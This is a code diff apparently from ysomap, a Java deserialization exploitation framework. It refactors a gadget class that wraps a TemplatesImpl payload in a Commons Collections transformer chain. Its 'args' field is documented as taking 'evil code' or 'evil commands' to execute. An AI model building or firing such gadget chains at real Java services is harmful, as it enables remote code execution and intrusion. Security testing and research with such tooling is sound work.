@@ -6,10 +6,8 @@ import ysomap.annotation.Dependencies;
 import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.jdk.TemplatesImplBullet;
-import ysomap.util.Reflections;
 
 import javax.xml.transform.Templates;
-import java.lang.reflect.InvocationTargetException;
 import java.util.LinkedList;
 
 /**
@@ -19,28 +17,15 @@ import java.util.LinkedList;
 @SuppressWarnings({"rawtypes"})
 @Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
 @Authors({ Authors.WH1T3P1G })
-public class TransformerWithTemplatesImplBullet extends TransformerBullet {
-
-    public ObjectGadget tplBullet;
-    public Class instantiateTransformer;
+public class TransformerWithTemplatesImplBullet extends AbstractTransformerBullet {
 
     @Require(name = "args" ,detail = "evil code (start with 'code:') or evil commands")
     public String args;
 
     @Override
-    public void initClazz() throws ClassNotFoundException {
-        super.initClazz();
-        if(version.equals("3")){
-            instantiateTransformer = Class.forName("org.apache.commons.collections.functors.InstantiateTransformer");
-        }else{
-            instantiateTransformer = Class.forName("org.apache.commons.collections4.functors.InstantiateTransformer");
-        }
-    }
-
-    @Override
     public Object getObject() throws Exception {
         initClazz();
-        tplBullet = new TemplatesImplBullet();
+        ObjectGadget tplBullet = new TemplatesImplBullet();
         tplBullet.set("body", args);
         Object obj = tplBullet.getObject();
         LinkedList<Object> transformers = new LinkedList<>();
@@ -50,11 +35,6 @@ public class TransformerWithTemplatesImplBullet extends TransformerBullet {
         return createTransformerArray(transformers);
     }
 
-    public Object createInstantiateTransformer(Object... args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
-        return Reflections.newInstance(instantiateTransformer.getName(),
-                new Class<?>[]{Class[].class,Object[].class},
-                args
-                );
-    }
+
 
 }
